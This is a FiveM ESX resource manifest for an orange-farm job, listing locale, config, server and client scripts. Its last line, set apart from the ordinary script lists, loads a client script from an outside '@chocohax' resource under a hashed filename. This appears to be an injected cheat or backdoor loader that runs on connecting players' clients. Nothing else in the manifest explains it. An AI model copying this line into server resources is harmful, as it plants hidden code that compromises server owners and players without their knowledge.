resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Farm De Laranjas'

version '1.0.0'

server_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/es.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'server/main.lua',
	'config.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/es.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'